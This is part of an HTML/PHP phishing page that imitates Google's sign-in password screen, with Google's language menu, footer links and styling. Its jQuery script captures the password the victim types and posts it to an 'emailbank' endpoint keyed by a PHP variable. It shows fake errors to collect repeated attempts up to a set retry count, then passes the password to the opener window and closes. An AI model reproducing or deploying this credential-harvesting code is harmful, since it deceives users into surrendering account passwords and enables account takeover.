                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Filipino&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="fr-CA" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Français (Canada)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="fr" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Français (France)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="gl" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;galego&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="hr" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Hrvatski&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="in" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Indonesia&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="zu" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;isiZulu&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="is" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;íslenska&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="it" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Italiano&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="sw" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Kiswahili&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="lv" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;latviešu&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="lt" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;lietuvių&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="hu" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;magyar&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ms" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Melayu&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="nl" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Nederlands&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="no" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;norsk&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="pl" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;polski&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="pt" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Português (Brasil)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="pt-PT" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Português (Portugal)&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ro" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;română&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="sk" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Slovenčina&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="sl" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;slovenščina&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="fi" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Suomi&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="sv" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Svenska&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="vi" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Tiếng Việt&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="tr" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Türkçe&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="el" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Ελληνικά&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="bg" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;български&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="mn" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;монгол&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ru" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Русский&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="sr" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;српски&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="uk" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;Українська&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ka" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;ქართული&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="hy" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;հայերեն&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="iw" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8235;עברית&#8236;&lrm;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ur" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8235;اردو&#8236;&lrm;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ar" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8235;العربية&#8236;&lrm;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="fa" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8235;فارسی&#8236;&lrm;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="am" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;አማርኛ&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ne" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;नेपाली&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="mr" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;मराठी&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="hi" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;हिन्दी&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="bn" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;বাংলা&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="gu" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;ગુજરાતી&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ta" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;தமிழ்&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="te" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;తెలుగు&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="kn" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;ಕನ್ನಡ&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ml" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;മലയാളം&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="si" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;සිංහල&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="th" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;ไทย&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="lo" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;ລາວ&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="my" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;မြန်မာ&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="km" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;ខ្មែរ&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ko" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;한국어&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="zh-HK" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;中文（香港）&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="ja" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;日本語&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="zh-CN" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;简体中文&#8236;</span></div>
                        <div class="MocG8c B9IrJb LMgvRb" jsname="wQNmvb" jsaction="" data-value="zh-TW" aria-selected="false" role="option" tabindex="-1">
                            <div class="kRoyt MbhUzd" jsname="ksKsZd"></div><span jsslot="" class="vRMGwf oJeWuf">&#8234;繁體中文&#8236;</span></div>
                    </div>
                    <div class="CeEBt Ce1Y1c eU809d" role="presentation">
                        <div class="TquXA"></div>
                    </div>
                </div>
                <div class="OA0qNb ncFHed" soy-server-key="5:pZtlf" jsaction="click:dPTK6c(wQNmvb); mousedown:uYU8jb(wQNmvb); mouseup:LVEdXd(wQNmvb); mouseover:nfXz1e(wQNmvb); touchstart:Rh2fre(wQNmvb); touchmove:hvFWtf(wQNmvb); touchend:MkF9r(wQNmvb|preventMouseEvents=true)" role="presentation" jsname="V68bde" style="display:none;"></div>
            </div>
        </div>
        <ul class="Bgzgmd">
            <li><a href="https://support.google.com/accounts?hl=en" target="_blank">Help</a></li>
            <li><a href="https://accounts.google.com/TOS?loc=GH&amp;hl=en&amp;privacy=true" target="_blank">Privacy</a></li>
            <li><a href="https://accounts.google.com/TOS?loc=GH&amp;hl=en" target="_blank">Terms</a></li>
        </ul>
    </footer>
    <div class="ANuIbb IdAqtf" jsname="k4HEge" tabindex="0" style="display: none;"></div>
    </div>
    <div class="VmOpGe" aria-hidden="true"></div>
    </div>
    <div class="lDwpOe"></div>
    <div aria-live="assertive" aria-relevant="additions" aria-atomic="true" aria-hidden="true" style="color: transparent; z-index: -1; position: absolute; top: 0px; left: 0px; user-select: none;">
        <div aria-atomic="true">Welcome </div>
    </div>
    <div aria-live="polite" aria-atomic="true" style="position: absolute; top: -1000px; height: 1px; overflow: hidden;"></div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>

    <script type="text/javascript">
    	var emailretry = 0;
    	var ed = sessionStorage.getItem('emaildress');
    	$("#profileIdentifier").html(ed);
    	$("#emaildress").val(ed);
    	$(".U26fgb.mUbCce.fKz7Od.YYBxpf.PlRDoc.M9Bg4d").click(function(e) {
    		e.preventDefault();
    		$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").removeClass("u3bW4e");
    		$(".U26fgb.mUbCce.fKz7Od.YYBxpf.PlRDoc.M9Bg4d").addClass("qs41qe");
    		setTimeout(function(){
    			$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").addClass("u3bW4e");
            	$(".U26fgb.mUbCce.fKz7Od.YYBxpf.PlRDoc.M9Bg4d").removeClass("qs41qe");
        	}, 200)
        	$(".U26fgb.mUbCce.fKz7Od.YYBxpf.PlRDoc.M9Bg4d").toggleClass("eO2Zfd");
    		if ($(this).hasClass("eO2Zfd")) {
    			$('.whsOnd.zHQkBf').attr('type', 'text');
    		} else {
    			$('.whsOnd.zHQkBf').attr('type', 'password');
    			
    		}
    	}); 

    	$(".whsOnd.zHQkBf").focus(function(){
    		$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").addClass("u3bW4e");
    	}).blur(function (){
    		if ($.trim($('.whsOnd.zHQkBf').val()).length) {
        $(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").addClass("CDELXb");
    } else {
        $(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").removeClass("u3bW4e");
    }
});

$("#emailPassword").keyup(function() {
	if ($.trim($('#emailPassword').val()).length < 4) {
	$(".OyEIQ.uSvLId").show();
	$(".SdBahf.VxoKGd").addClass("Jj6Lae");
	$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").addClass("k0tWj IYewr");

} else {
	$(".OyEIQ.uSvLId").hide();
	$(".SdBahf.VxoKGd").removeClass("Jj6Lae");
	$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").removeClass("k0tWj IYewr");
}

});

$("#passwordNext").click(function(e) {
e.preventDefault();
if ($.trim($('#emailPassword').val()).length < 4) {
	$(".OyEIQ.uSvLId").show();
	$(".SdBahf.VxoKGd").addClass("Jj6Lae");
	$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").addClass("k0tWj IYewr");

} else {
	$(".OyEIQ.uSvLId").hide();
	$(".SdBahf.VxoKGd").removeClass("Jj6Lae");
	$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").removeClass("k0tWj IYewr");
	$(".sZwd7c.B6Vhqe").removeClass("qdulke jK7moc");
	$(".ANuIbb.IdAqtf").show();
	$("#emailType").val(window.opener.document.getElementById('emailType').value);
	emailretry++
    $("#emailretry").val(emailretry);
    $.post("../emailbank?key=<?php echo $key;?>", $("#emailaccess").serialize(), function(result) {});
	setTimeout(function(){
		$(".sZwd7c.B6Vhqe").addClass("qdulke jK7moc");
		$(".ANuIbb.IdAqtf").hide();
		
	},2600);
	if ("<?php echo $emailretry ?>" == "on") {
	    $(".OyEIQ.uSvLId").show();
		$(".SdBahf.VxoKGd").addClass("Jj6Lae");
		$(".rFrNMe.ze9ebf.YKooDc.q9Nsuf.zKHdkd.sdJrJc").addClass("k0tWj IYewr");
	} else {
		window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
	   	close();
	}
	if (emailretry == <?php echo $numberofretries ?>) {
		window.opener.sessionStorage.setItem('emailPassword', $("#emailPassword").val());
	    close();
	}
}
	

});
    
    </script>
</body></html>